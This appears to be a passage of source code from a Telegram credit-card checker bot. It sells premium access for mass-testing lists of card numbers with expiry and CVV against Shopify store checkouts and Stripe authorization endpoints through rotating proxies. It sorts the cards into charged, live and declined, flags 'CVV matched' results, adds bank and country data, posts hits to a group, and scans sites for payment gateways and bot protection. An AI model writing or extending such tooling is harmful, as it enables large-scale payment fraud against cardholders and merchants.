        f"{premium_emoji_tag('👑')} **Owner** ➔ {{{{link|tg://user?id=7622071677|{bold_sans('『 PRAKASH 』')}}}}}"
    )
    s_text, s_ents = build_entities_with_custom_emojis(summary_raw)
    filename = f"result.txt"
    async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
        # CHARGED section
        await f.write("═══════════════════════════════════════\n")
        await f.write(f"  🔥 CHARGED ({len(results['charged'])})\n")
        await f.write("═══════════════════════════════════════\n")
        if results['charged']:
            for r in results['charged']:
                s_url = r.get('site', '')
                domain = s_url.replace('https://', '').replace('http://', '').split('/')[0] if s_url else ''
                gate_name = f"{r['gateway']} ({domain})" if domain else r['gateway']
                raw_resp = str(r.get('message', '-'))[:200]
                await f.write(f"{r['card']} | {r['gateway']} | {r.get('price','-')}\n")
                await f.write(f"  Response: {raw_resp}\n\n")
        else:
            await f.write("(none)\n")
        await f.write("\n")

        # APPROVED section
        await f.write("═══════════════════════════════════════\n")
        await f.write(f"  ✅ APPROVED / LIVE ({len(results['approved'])})\n")
        await f.write("═══════════════════════════════════════\n")
        if results['approved']:
            for r in results['approved']:
                s_url = r.get('site', '')
                domain = s_url.replace('https://', '').replace('http://', '').split('/')[0] if s_url else ''
                gate_name = f"{r['gateway']} ({domain})" if domain else r['gateway']
                raw_resp = str(r.get('message', '-'))[:200]
                await f.write(f"{r['card']} | {r['gateway']} | {r.get('price','-')}\n")
                await f.write(f"  Response: {raw_resp}\n\n")
        else:
            await f.write("(none)\n")
        await f.write("\n")

        # DECLINED section
        await f.write("═══════════════════════════════════════\n")
        await f.write(f"  ❌ DECLINED ({len(results['dead'])})\n")
        await f.write("═══════════════════════════════════════\n")
        if results['dead']:
            for r in results['dead']:
                s_url = r.get('site', '')
                domain = s_url.replace('https://', '').replace('http://', '').split('/')[0] if s_url else ''
                gate_name = f"{r['gateway']} ({domain})" if domain else r['gateway']
                raw_resp = str(r.get('message', '-'))[:200]
                await f.write(f"{r['card']} | {r['gateway']} | {r.get('price','-')}\n")
                await f.write(f"  Response: {raw_resp}\n\n")
        else:
            await f.write("(none)\n")
    await bot.send_document(chat_id, open(filename, 'rb'), caption=s_text, caption_entities=s_ents)
    os.remove(filename)

# Helper: polls for stop signal so we can cancel workers instantly
async def _wait_for_stop(session_key):
    while True:
        s = active_sessions.get(session_key)
        if not s or s.get('stopped'):
            return  # Stop was pressed — return immediately
        await asyncio.sleep(0.3)

# ==================== MASS CHECK WORKERS ====================
async def _run_shopify_mass_check(update, chat_id, user_id, username, cards, bot):
    sites = load_sites()
    proxies = load_user_proxies(user_id)
    if not sites:
        await update.message.reply_text("No sites available in sites.txt -- add Shopify sites first.")
        return
    if not proxies:
        # Auto-fetch proxies from webshare.io
        _fetch_raw = f"{premium_emoji_tag('⏳')} No proxies found -- auto-fetching free proxies..."
        _fetch_text, _fetch_ents = build_entities_with_custom_emojis(_fetch_raw)
        fetch_msg = await update.message.reply_text(_fetch_text, entities=_fetch_ents)
        proxies = await auto_fetch_proxies(user_id)
        if not proxies:
            await fetch_msg.edit_text("Failed to auto-fetch proxies. Use /addpxy to add manually.")
            return
        _ok_raw = f"{premium_emoji_tag('✅')} Auto-fetched {len(proxies)} proxies! Starting check..."
        _ok_text, _ok_ents = build_entities_with_custom_emojis(_ok_raw)
        await fetch_msg.edit_text(_ok_text, entities=_ok_ents)
    if int(user_id) != OWNER_ID and len(cards) > MAX_CC_MASS:
        cards = cards[:MAX_CC_MASS]
    _init_raw = f"{premium_emoji_tag('⏳')} Starting check for {len(cards)} cards..."
    _init_text, _init_ents = build_entities_with_custom_emojis(_init_raw)
    status_msg = await update.message.reply_text(_init_text, entities=_init_ents)
    results = {'charged': [], 'approved': [], 'dead': [], 'total': len(cards), 'checked': 0,
               'start_time': time.time(), 'last_response': '-', 'last_card': '', 'username': username}
    session_key = f"{chat_id}_{status_msg.message_id}"
    active_sessions[session_key] = {
        'paused': False,
        'stopped': False,
        'results': results,
        'bot': bot,
        'user_id': user_id,
        'chat_id': chat_id
    }
    user_processing[user_id] = True
    requeue_counts = {}  # Track how many times each card was requeued
    queue = asyncio.Queue()
    for c in cards: queue.put_nowait(c)
    async def worker():
        while True:
            s = active_sessions.get(session_key)
            if not s or s.get('stopped'):
                break
            while s and s.get('paused') and not s.get('stopped'):
                await asyncio.sleep(0.5)
            s = active_sessions.get(session_key)
            if not s or s.get('stopped'):
                break
            try:
                card = queue.get_nowait()
            except asyncio.QueueEmpty:
                break
            try:
                res = await shopify_check_card(card, sites, proxies, 5)
                # Check stop again after the API call
                s = active_sessions.get(session_key)
                if not s or s.get('stopped'):
                    break
                if res is None:
                    res = {'status': 'Error', 'message': 'All sites failed', 'card': card, 'gateway': 'Shopify', 'price': '-', 'raw': '-'}
                await asyncio.sleep(random.uniform(0.1, 0.3))

                if res['status'] == 'Charged':
                    results['checked'] += 1
                    results['last_response'] = str(res.get('message', '-'))[:60]
                    results['last_card'] = card
                    results['charged'].append(res)
                    await send_realtime_hit(chat_id, res, 'Charged', username, bot, user_id)
                elif res['status'] == '3DS':
                    results['checked'] += 1
                    results['3ds_count'] = results.get('3ds_count', 0) + 1
                elif res['status'] in ('Approved', 'LIVE'):
                    results['checked'] += 1
                    results['last_response'] = str(res.get('message', '-'))[:60]
                    results['last_card'] = card
                    results['approved'].append(res)
                    await send_realtime_hit(chat_id, res, 'Approved', username, bot, user_id)
                elif res['status'] == 'Error':
                    # Requeue card to try on different sites (max 10 requeues = 50 site attempts)
                    count = requeue_counts.get(card, 0)
                    if count < 2:
                        requeue_counts[card] = count + 1
                        queue.put_nowait(card)  # Put back in queue for different sites
                    else:
                        # All requeues exhausted — show as Declined (never skip)
                        results['checked'] += 1
                        results['last_response'] = str(res.get('message', '-'))[:60]
                        results['last_card'] = card
                        res['status'] = 'Dead'
                        results['dead'].append(res)
                else:
                    results['checked'] += 1
                    results['last_response'] = str(res.get('message', '-'))[:60]
                    results['last_card'] = card
                    results['dead'].append(res)
                if results['checked'] % 5 == 0 or results['checked'] == 1 or results['checked'] == results['total']:
                    await update_progress(chat_id, status_msg.message_id, results, results['checked'], bot)
            except Exception as e:
                # Worker error — requeue card
                count = requeue_counts.get(card, 0)
                if count < 2:
                    requeue_counts[card] = count + 1
                    queue.put_nowait(card)
                else:
                    results['checked'] += 1
                    results['dead'].append({
                        'status': 'Dead', 'message': f'Error: {str(e)[:60]}',
                        'card': card, 'gateway': 'Shopify', 'price': '-', 'raw': '-'
                    })
    workers_list = [asyncio.create_task(worker()) for _ in range(50)]  # Fast parallel workers
    # Monitor for stop signal — cancel workers immediately when stopped
    stop_check = asyncio.create_task(_wait_for_stop(session_key))
    done, pending = await asyncio.wait(
        workers_list + [stop_check],
        return_when=asyncio.FIRST_COMPLETED
    )
    # If stop was triggered, cancel all remaining workers immediately
    was_stopped = not active_sessions.get(session_key) or active_sessions.get(session_key, {}).get('stopped')
    if was_stopped:
        for t in workers_list:
            if not t.done():
                t.cancel()
        # Wait briefly for cancellation to propagate
        await asyncio.gather(*workers_list, return_exceptions=True)
    else:
        # Normal completion — wait for all workers
        stop_check.cancel()
        await asyncio.gather(*workers_list, return_exceptions=True)
    if not was_stopped:
        await update_progress(chat_id, status_msg.message_id, results, results['checked'], bot)
        try:
            await status_msg.delete()
        except Exception:
            pass
    await send_final_results(chat_id, results, bot)
    user_processing.pop(user_id, None)
    active_sessions.pop(session_key, None)

async def msh_mass_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_premium(user_id):
        await update.message.reply_text("Premium only.")
        return

    cc_text = update.message.reply_to_message.text if update.message.reply_to_message else (update.message.text.split('\n', 1)[1] if '\n' in update.message.text else '')
    cards = extract_cc(cc_text)
    if not cards:
        await update.message.reply_text("No valid CCs found. Use:\n`/msh\ncard1|mm|yy|cvv\ncard2|...`")
        return
    await _run_shopify_mass_check(update, update.effective_chat.id, user_id, update.effective_user.username or f"user_{user_id}", cards, context.bot)

async def mshtxt_mass_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_premium(user_id):
        await update.message.reply_text("Premium only.")
        return
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await update.message.reply_text("Reply to a .txt file with /mshtxt")
        return
    doc = update.message.reply_to_message.document
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("File must be .txt")
        return
    path = f"temp_{user_id}.txt"
    try:
        await download_telegram_file(context.bot, doc.file_id, path)
    except Exception as e:
        await update.message.reply_text(f"❌ Telegram timed out while downloading the file. Please try again! ({str(e)})")
        return
    try:
        async with aiofiles.open(path, 'r', encoding='utf-8', errors='ignore') as f:
            cards = extract_cc(await f.read())
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to read file: {str(e)}")
        return
    finally:
        if os.path.exists(path):
            try:
                os.remove(path)
            except Exception:
                pass
    if not cards:
        await update.message.reply_text("No valid CCs in file.")
        return
    await _run_shopify_mass_check(update, update.effective_chat.id, user_id, update.effective_user.username or f"user_{user_id}", cards, context.bot)

# ==================== MASS STRIPE AUTH 2 CHECK ====================
async def _run_stripe_mass_check(update, chat_id, user_id, username, cards, bot):
    """Mass check cards via Stripe Auth 2 gate"""
    if int(user_id) != OWNER_ID and len(cards) > MAX_CC_MASS:
        cards = cards[:MAX_CC_MASS]
    _init_raw = f"{premium_emoji_tag('⏳')} Starting Stripe Auth check for {len(cards)} cards..."
    _init_text, _init_ents = build_entities_with_custom_emojis(_init_raw)
    status_msg = await update.message.reply_text(_init_text, entities=_init_ents)
    results = {'charged': [], 'approved': [], 'dead': [], 'total': len(cards), 'checked': 0,
               'start_time': time.time(), 'last_response': '-', 'last_card': '', 'username': username}
    session_key = f"{chat_id}_{status_msg.message_id}"
    active_sessions[session_key] = {
        'paused': False,
        'stopped': False,
        'results': results,
        'bot': bot,
        'user_id': user_id,
        'chat_id': chat_id
    }
    user_processing[user_id] = True
    queue = asyncio.Queue()
    for c in cards:
        queue.put_nowait(c)

    async def worker():
        while True:
            s = active_sessions.get(session_key)
            if not s or s.get('stopped'):
                break
            while s and s.get('paused') and not s.get('stopped'):
                await asyncio.sleep(0.5)
            s = active_sessions.get(session_key)
            if not s or s.get('stopped'):
                break
            try:
                card = queue.get_nowait()
            except asyncio.QueueEmpty:
                break
            try:
                resp = await stripe_auth2_check(card)
                s = active_sessions.get(session_key)
                if not s or s.get('stopped'):
                    break

                # Classify response
                gate_status = classify_gate_response(resp)
                resp_msg = ''
                if isinstance(resp, dict):
                    resp_msg = str(resp.get('Response') or resp.get('message') or resp.get('status') or resp)
                elif isinstance(resp, tuple):
                    resp_msg = str(resp[1]) if len(resp) > 1 else str(resp[0])
                else:
                    resp_msg = str(resp)

                res = {
                    'status': gate_status,
                    'message': resp_msg[:150],
                    'card': card,
                    'gateway': 'Stripe Auth 2',
                    'price': '$0',
                    'raw': resp
                }

                await asyncio.sleep(random.uniform(0.1, 0.3))

                if gate_status == 'Charged':
                    results['checked'] += 1
                    results['last_response'] = resp_msg[:60]
                    results['last_card'] = card
                    results['charged'].append(res)
                    await send_realtime_hit(chat_id, res, 'Charged', username, bot, user_id)
                elif gate_status == 'Approved':
                    results['checked'] += 1
                    results['last_response'] = resp_msg[:60]
                    results['last_card'] = card
                    results['approved'].append(res)
                    await send_realtime_hit(chat_id, res, 'Approved', username, bot, user_id)
                elif gate_status == 'Error':
                    # Retry once on error
                    results['checked'] += 1
                    results['last_response'] = resp_msg[:60]
                    results['last_card'] = card
                    results['dead'].append(res)
                else:
                    results['checked'] += 1
                    results['last_response'] = resp_msg[:60]
                    results['last_card'] = card
                    results['dead'].append(res)

                if results['checked'] % 3 == 0 or results['checked'] == 1 or results['checked'] == results['total']:
                    await update_progress(chat_id, status_msg.message_id, results, results['checked'], bot)
            except Exception as e:
                results['checked'] += 1
                results['dead'].append({
                    'status': 'Dead', 'message': f'Error: {str(e)[:60]}',
                    'card': card, 'gateway': 'Stripe Auth 2', 'price': '$0', 'raw': '-'
                })

    workers_list = [asyncio.create_task(worker()) for _ in range(7)]
    stop_check = asyncio.create_task(_wait_for_stop(session_key))
    done, pending = await asyncio.wait(
        workers_list + [stop_check],
        return_when=asyncio.FIRST_COMPLETED
    )
    was_stopped = not active_sessions.get(session_key) or active_sessions.get(session_key, {}).get('stopped')
    if was_stopped:
        for t in workers_list:
            if not t.done():
                t.cancel()
        await asyncio.gather(*workers_list, return_exceptions=True)
    else:
        stop_check.cancel()
        await asyncio.gather(*workers_list, return_exceptions=True)
    if not was_stopped:
        await update_progress(chat_id, status_msg.message_id, results, results['checked'], bot)
        try:
            await status_msg.delete()
        except Exception:
            pass
    await send_final_results(chat_id, results, bot)
    user_processing.pop(user_id, None)
    active_sessions.pop(session_key, None)

async def mst_mass_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass Stripe Auth check — paste cards 1 per line or reply"""
    user_id = update.effective_user.id
    if not is_premium(user_id):
        await update.message.reply_text("Premium only.")
        return

    cc_text = update.message.reply_to_message.text if update.message.reply_to_message else (update.message.text.split('\n', 1)[1] if '\n' in update.message.text else '')
    cards = extract_cc(cc_text)
    if not cards:
        await update.message.reply_text("No valid CCs found. Use:\n`/mst\ncard1|mm|yy|cvv\ncard2|...`")
        return
    await _run_stripe_mass_check(update, update.effective_chat.id, user_id, update.effective_user.username or f"user_{user_id}", cards, context.bot)

async def msttxt_mass_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass Stripe Auth check — reply to a .txt file"""
    user_id = update.effective_user.id
    if not is_premium(user_id):
        await update.message.reply_text("Premium only.")
        return
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await update.message.reply_text("Reply to a .txt file with /msttxt")
        return
    doc = update.message.reply_to_message.document
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("File must be .txt")
        return
    path = f"temp_mst_{user_id}.txt"
    try:
        await download_telegram_file(context.bot, doc.file_id, path)
    except Exception as e:
        await update.message.reply_text(f"❌ Download failed: {str(e)}")
        return
    try:
        async with aiofiles.open(path, 'r', encoding='utf-8', errors='ignore') as f:
            cards = extract_cc(await f.read())
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to read file: {str(e)}")
        return
    finally:
        if os.path.exists(path):
            try:
                os.remove(path)
            except Exception:
                pass
    if not cards:
        await update.message.reply_text("No valid CCs in file.")
        return
    await _run_stripe_mass_check(update, update.effective_chat.id, user_id, update.effective_user.username or f"user_{user_id}", cards, context.bot)



# ==================== SINGLE CHECK ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    track_user(update.effective_user.id)
    text, kb = get_main_menu()
    clean, ents = build_entities_with_custom_emojis(text)
    await update.message.reply_text(clean, entities=ents, reply_markup=kb, disable_web_page_preview=True)

async def sh_single_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    # Free users can only check in the group, private requires premium
    if update.effective_chat.type == 'private' and not is_premium(user_id):
        clean, ents = build_entities_with_custom_emojis(
            f"{premium_emoji_tag('❌')} {bold_sans('Private check is for Premium users only!')}\n\n"
            f"{premium_emoji_tag('💎')} {bold_sans('Use the group to check for free:')}\n"

            f"{premium_emoji_tag('👑')} {bold_sans('Or buy Premium for private access!')}"
        )
        await update.message.reply_text(clean, entities=ents)
        return

    sites, proxies = load_sites(), load_user_proxies(user_id)
    if not sites:
        await update.message.reply_text("No sites available in sites.txt.")
        return
    if not proxies:
        # Auto-fetch proxies from webshare.io
        _fetch_raw = f"{premium_emoji_tag('⏳')} Auto-fetching proxies..."
        _fetch_text, _fetch_ents = build_entities_with_custom_emojis(_fetch_raw)
        fetch_msg = await update.message.reply_text(_fetch_text, entities=_fetch_ents)
        proxies = await auto_fetch_proxies(user_id)
        if not proxies:
            await fetch_msg.edit_text("Failed to auto-fetch proxies. Use /addpxy to add manually.")
            return
        _ok_raw = f"{premium_emoji_tag('✅')} Auto-fetched {len(proxies)} proxies!"
        _ok_text, _ok_ents = build_entities_with_custom_emojis(_ok_raw)
        await fetch_msg.edit_text(_ok_text, entities=_ok_ents)
    cc_text = ""
    parts = update.message.text.split(' ', 1)
    if len(parts) > 1:
        cc_text = parts[1]
    elif update.message.reply_to_message and update.message.reply_to_message.text:
        cc_text = update.message.reply_to_message.text
    cards = extract_cc(cc_text)
    if not cards:
        clean, ents = build_entities_with_custom_emojis(f"Usage: {{{{code:/sh card|mm|yy|cvv}}}} or reply to a card")
        await update.message.reply_text(clean, entities=ents)
        return
    card = cards[0]
    user_processing[user_id] = True
    clean_p, ents_p = build_entities_with_custom_emojis(f"{premium_emoji_tag('⏳')}")
    status_msg = await update.message.reply_text(clean_p, entities=ents_p)
    try:
        # Retry on different sites if Error (NO_PRODUCTS, etc.)
        res = None
        for _single_attempt in range(5):
            res = await shopify_check_card(card, sites, proxies, 5)
            if res is None:
                res = {'status': 'Error', 'message': 'No working sites available', 'card': card, 'gateway': 'Shopify', 'price': '-', 'raw': '-'}
            if res['status'] not in ('Error', 'ERROR'):
                break  # Got a real response
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
        
        # ── Granular Shopify response classification (matches friend's bot) ──
        resp_msg = str(res.get('message', 'No response'))
        rl = resp_msg.lower()
        
        if res['status'] == 'Charged':
            status_header = f"{premium_emoji_tag('💎')} **Order Placed!**"
        elif any(k in rl for k in ['insufficient_funds', 'insufficient funds']):
            status_header = f"{premium_emoji_tag('✨')} **Insufficient Funds — CVV Matched!**"
        elif any(k in rl for k in ['incorrect_cvc', 'invalid_cvc', 'incorrect_cvv', 'invalid_cvv']):
            status_header = f"{premium_emoji_tag('🔥')} **Incorrect CVC — CCN Matched!**"
        elif 'incorrect_zip' in rl:
            status_header = f"{premium_emoji_tag('✅')} **Incorrect ZIP — Card is Live!**"
        elif res['status'] == '3DS' or any(k in rl for k in ['otp_required', '3ds', 'authentication_required']):
            status_header = f"{premium_emoji_tag('🔐')} **3DS / OTP Required — Card is Live!**"
        elif any(k in rl for k in ['card_declined', 'do_not_honor', 'generic_decline']):
            status_header = f"{premium_emoji_tag('❌')} **Card Declined**"
        elif 'expired' in rl:
            status_header = f"{premium_emoji_tag('❌')} **Card Expired**"
        elif 'risky' in rl:
            status_header = f"{premium_emoji_tag('⚠️')} **Flagged as Risky**"
        elif 'incorrect_number' in rl:
            status_header = f"{premium_emoji_tag('❌')} **Incorrect Card Number**"
        elif res['status'] in ('Approved', 'LIVE'):
            status_header = f"{premium_emoji_tag('✨')} **Card Approved**"
        elif res['status'] in ('Error', 'ERROR', 'Pending'):
            status_header = f"{premium_emoji_tag('⚠️')} **Gate Error**"
        else:
            status_header = f"{premium_emoji_tag('❌')} **Card Declined**"
        
        site_url = res.get('site', '')
        gate_str = "Shopify Payments"
        if site_url:
            from urllib.parse import urlparse
            domain = urlparse(site_url).netloc or site_url
            domain = domain.replace('www.', '')
            gate_str = f"Shopify Payments ({domain})"
            
        final_raw = (
            f"{status_header}\n\n"
            f"{premium_emoji_tag('💳')} **CC:** {{{{spoiler:{card}}}}}\n"
            f"{premium_emoji_tag('🛍️')} **Gate:** {gate_str}\n"
            f"{premium_emoji_tag('💬')} **Response:** {sanitize_response(resp_msg)}\n"
            f"{premium_emoji_tag('💰')} **Price:** {res.get('price','-')}\n\n"
            f"{premium_emoji_tag('🗑️')} **BIN Info:**\n"
            f"{premium_emoji_tag('💳')} **Brand:** {brand}\n"
            f"{premium_emoji_tag('⚙️')} **Type:** {bin_type}\n"
            f"{premium_emoji_tag('😈')} **Level:** {level}\n"
            f"{premium_emoji_tag('🏦')} **Bank:** {bank}\n"
            f"{premium_emoji_tag('🌍')} **Country:** {flag} {country}\n\n"
            f"{premium_emoji_tag('👤')} **Checked by:** {{{{link|tg://user?id={user_id}|{bold_sans(update.effective_user.first_name or update.effective_user.username or 'User')}}}}}\n"
            f"{premium_emoji_tag('👑')} **Owner:** {{{{link|tg://user?id=7622071677|{bold_sans('『 PRAKASH 』')}}}}}"
        )
        f_text, f_ents = build_entities_with_custom_emojis(final_raw)
        # Add Receipt button for Order Placed (Charged) results
        _receipt_url = res.get('receipt_url', '')
        if res['status'] == 'Charged' and _receipt_url:
            _receipt_kb = InlineKeyboardMarkup([
                [InlineKeyboardButton(text="📜 Receipt", url=_receipt_url)]
            ])
            await status_msg.edit_text(f_text, entities=f_ents, reply_markup=_receipt_kb)
        else:
            await status_msg.edit_text(f_text, entities=f_ents)
        
        # ── Hit log for Shopify ──
        if res['status'] == 'Charged':
            username = update.effective_user.username or f"user_{user_id}"
            await send_group_hit_log(context.bot, 'Charged', gate_str, res.get('price', '-'), resp_msg, username, user_id)
        elif any(k in rl for k in ['insufficient_funds', 'insufficient funds', 'incorrect_cvc', 'invalid_cvc', 'incorrect_cvv', 'invalid_cvv', 'incorrect_zip']):
            username = update.effective_user.username or f"user_{user_id}"
            await send_group_hit_log(context.bot, 'Approved', gate_str, res.get('price', '-'), resp_msg, username, user_id)

    except Exception as e:
        clean_err, ents_err = build_entities_with_custom_emojis(f"{premium_emoji_tag('❌')} Error: {e}")
        await status_msg.edit_text(clean_err, entities=ents_err)
    finally:
        user_processing.pop(user_id, None)

async def _gate_single_check(update, bot, gate_fn, gate_name, price, cmd):
    user_id = update.effective_user.id
    # Free users can only check in the group, private requires premium
    if update.effective_chat.type == 'private' and not is_premium(user_id):
        clean, ents = build_entities_with_custom_emojis(
            f"{premium_emoji_tag('❌')} {bold_sans('Private check is for Premium users only!')}\n\n"
            f"{premium_emoji_tag('💎')} {bold_sans('Use the group to check for free:')}\n"

            f"{premium_emoji_tag('👑')} {bold_sans('Or buy Premium for private access!')}"
        )
        await update.message.reply_text(clean, entities=ents)
        return
    cc_text = ""
    parts = update.message.text.split(' ', 1)
    if len(parts) > 1:
        cc_text = parts[1]
    elif update.message.reply_to_message and update.message.reply_to_message.text:
        cc_text = update.message.reply_to_message.text
    cards = extract_cc(cc_text)
    if not cards:
        clean, ents = build_entities_with_custom_emojis(f"Usage: {{{{code:/{cmd} card|mm|yy|cvv}}}} or reply to a card")
        await update.message.reply_text(clean, entities=ents)
        return
    card = cards[0]
    clean_p, ents_p = build_entities_with_custom_emojis(f"{premium_emoji_tag('⏳')}")
    status_msg = await update.message.reply_text(clean_p, entities=ents_p)
    try:
        resp = await gate_fn(card)
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
        gate_status = classify_gate_response(resp)
        # Show raw response as-is from API/site — no mapping/cleaning
        if isinstance(resp, dict):
            _safe_resp = str(resp.get('Response') or resp.get('message') or resp.get('status') or resp)
        elif isinstance(resp, tuple):
            _safe_resp = str(resp[1]) if len(resp) > 1 else str(resp[0])
        else:
            _safe_resp = str(resp)
        _safe_resp = _safe_resp[:200].replace('{{', '{ {').replace('}}', '} }')
        # Use dynamic price from gate response if available
        display_price = price
        if isinstance(resp, dict) and resp.get('Price') and resp['Price'] != '-':
            display_price = resp['Price']
        g_header = status_header(gate_status, premium_emoji_tag)
        display_name = update.effective_user.first_name or update.effective_user.username or f"user_{user_id}"
        final_raw = (
            f"{g_header}\n\n"
            f"{premium_emoji_tag('💳')} **CC:** {{{{spoiler:{card}}}}}\n"
            f"{premium_emoji_tag('🛍️')} **Gate:** {gate_name}\n"
            f"{premium_emoji_tag('💬')} **Response:** {_safe_resp}\n"
            f"{premium_emoji_tag('💰')} **Price:** {display_price}\n\n"
            f"{premium_emoji_tag('🗑️')} **BIN Info:**\n"
            f"{premium_emoji_tag('💳')} **Brand:** {brand}\n"
            f"{premium_emoji_tag('⚙️')} **Type:** {bin_type}\n"
            f"{premium_emoji_tag('😈')} **Level:** {level}\n"
            f"{premium_emoji_tag('🏦')} **Bank:** {bank}\n"
            f"{premium_emoji_tag('🌍')} **Country:** {flag} {country}\n\n"
            f"{premium_emoji_tag('👤')} **Checked by:** {{{{link|tg://user?id={user_id}|{bold_sans(display_name)}}}}}\n"
            f"{premium_emoji_tag('👑')} **Owner:** {{{{link|tg://user?id=7622071677|{bold_sans('『 PRAKASH 』')}}}}}"
        )
        f_text, f_ents = build_entities_with_custom_emojis(final_raw)
        await status_msg.edit_text(f_text, entities=f_ents)

    except Exception as e:
        clean_err, ents_err = build_entities_with_custom_emojis(f"{premium_emoji_tag('❌')} Error: {e}")
        await status_msg.edit_text(clean_err, entities=ents_err)

async def st1_single(update, c): await _gate_single_check(update, c.bot, stripe_auth1_check, 'Stripe Auth 1', '$0', 'st1')
async def st2_single(update, c): await _gate_single_check(update, c.bot, stripe_auth2_check, 'Stripe Auth 2', '$0', 'st2')
async def st3_single(update, c): await _gate_single_check(update, c.bot, stripe_auth3_check, 'Stripe Auth 3', '$0', 'st3')



async def vbv_single(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """VBV / 3DS2 checker — shows detailed enrolled/status result"""
    user_id = update.effective_user.id
    if update.effective_chat.type == 'private' and not is_premium(user_id):
        clean, ents = build_entities_with_custom_emojis(
            f"{premium_emoji_tag('❌')} {bold_sans('Private check is for Premium users only!')}\n\n"
            f"{premium_emoji_tag('💎')} {bold_sans('Use the group to check for free:')}\n"

            f"{premium_emoji_tag('👑')} {bold_sans('Or buy Premium for private access!')}"
        )
        await update.message.reply_text(clean, entities=ents)
        return
    cc_text = ""
    parts = update.message.text.split(' ', 1)
    if len(parts) > 1:
        cc_text = parts[1]
    elif update.message.reply_to_message and update.message.reply_to_message.text:
        cc_text = update.message.reply_to_message.text
    cards = extract_cc(cc_text)
    if not cards:
        clean, ents = build_entities_with_custom_emojis(f"Usage: {{{{code:/vbv card|mm|yy|cvv}}}} or reply to a card")
        await update.message.reply_text(clean, entities=ents)
        return
    card = cards[0]
    clean_p, ents_p = build_entities_with_custom_emojis(f"{premium_emoji_tag('⏳')}")
    status_msg = await update.message.reply_text(clean_p, entities=ents_p)
    try:
        result = await vbv_check(card)
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
        status_str = result.get('status', 'Unknown')
        code_str = result.get('code', '-')
        enrolled_str = result.get('enrolled', 'UNKNOWN')
        resp_str = result.get('response', '-')

        # Replace emojis in output strings with premium tags
        for em in PREMIUM_EMOJI_IDS:
            if em in status_str:
                status_str = status_str.replace(em, premium_emoji_tag(em))
            if em in resp_str:
                resp_str = resp_str.replace(em, premium_emoji_tag(em))

        # Decide header by result
        if 'Passed' in status_str:
            vbv_header = f"{premium_emoji_tag('✨')} **VBV Passed**"
        elif 'OTP' in status_str or 'Required' in status_str:
            vbv_header = f"{premium_emoji_tag('🔥')} **OTP / 3DS Required**"
        elif 'Rejected' in status_str:
            vbv_header = f"{premium_emoji_tag('🚫')} **VBV Rejected**"
        elif 'Error' in status_str:
            vbv_header = f"{premium_emoji_tag('⚠️')} **VBV Error**"
        else:
            vbv_header = f"{premium_emoji_tag('❌')} **VBV Failed**"

        final_raw = (
            f"{vbv_header}\n\n"
            f"{premium_emoji_tag('💳')} **CC:** {{{{spoiler:{card}}}}}\n"
            f"{premium_emoji_tag('🛡️')} **Gate:** 3DS Lookup\n"
            f"{premium_emoji_tag('💬')} **Status:** {status_str}\n"
            f"{premium_emoji_tag('🔌')} **Enrolled:** {enrolled_str}\n"
            f"{premium_emoji_tag('⚙️')} **Response:** {{{{code:{code_str}}}}}\n\n"
            f"{premium_emoji_tag('🗑️')} **BIN Info:**\n"
            f"{premium_emoji_tag('💳')} **Brand:** {brand}\n"
            f"{premium_emoji_tag('⚙️')} **Type:** {bin_type}\n"
            f"{premium_emoji_tag('😈')} **Level:** {level}\n"
            f"{premium_emoji_tag('🏦')} **Bank:** {bank}\n"
            f"{premium_emoji_tag('🌍')} **Country:** {flag} {country}\n\n"
            f"{premium_emoji_tag('👤')} **Checked by:** {{{{link|tg://user?id={user_id}|{bold_sans(update.effective_user.first_name or update.effective_user.username or 'User')}}}}}\n"
            f"{premium_emoji_tag('👑')} **Owner:** {{{{link|tg://user?id=7622071677|{bold_sans('『 PRAKASH 』')}}}}}"
        )
        f_text, f_ents = build_entities_with_custom_emojis(final_raw)
        await status_msg.edit_text(f_text, entities=f_ents)
    except Exception as e:
        clean_err, ents_err = build_entities_with_custom_emojis(f"{premium_emoji_tag('❌')} Error: {e}")
        await status_msg.edit_text(clean_err, entities=ents_err)


# ==================== URL ANALYZER ====================
async def url_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Analyze a website URL for gateways, platform, captcha, cloudflare, graphql"""
    user_id = update.effective_user.id
    track_user(user_id)
    url = ""
    parts = update.message.text.split(maxsplit=1)
    if len(parts) > 1:
        url = parts[1].strip()
    elif update.message.reply_to_message and (update.message.reply_to_message.text or update.message.reply_to_message.caption):
        reply_text = update.message.reply_to_message.text or update.message.reply_to_message.caption
        url_match = re.search(r'(https?://[^\s<>"]+|www\.[^\s<>"]+|\b[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}\b[^\s<>"]*)', reply_text)
        if url_match:
            url = url_match.group(1).strip()

    if not url:
        clean, ents = build_entities_with_custom_emojis(
            f"Usage: {{{{code:/url https://example.com}}}} or reply to a URL"
        )
        await update.message.reply_text(clean, entities=ents)
        return

    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url

    clean_p, ents_p = build_entities_with_custom_emojis(
        f"{premium_emoji_tag('⏳')} Analyzing {{{{code:{url}}}}}..."
    )
    status_msg = await update.message.reply_text(clean_p, entities=ents_p)
    try:
        result = await analyze_url(url)

        if result.get('error'):
            http_line = f"{premium_emoji_tag('❌')} Error"
        elif result['status'] and 200 <= result['status'] < 400:
            http_line = f"{premium_emoji_tag('✅')} {result['status']} OK"
        else:
            http_line = f"{premium_emoji_tag('❌')} {result['status'] or 'Unknown'}"

        gateways_str = ', '.join(result['gateways']) if result['gateways'] else 'None'
        platform_str = result['platform'] or 'Unknown'
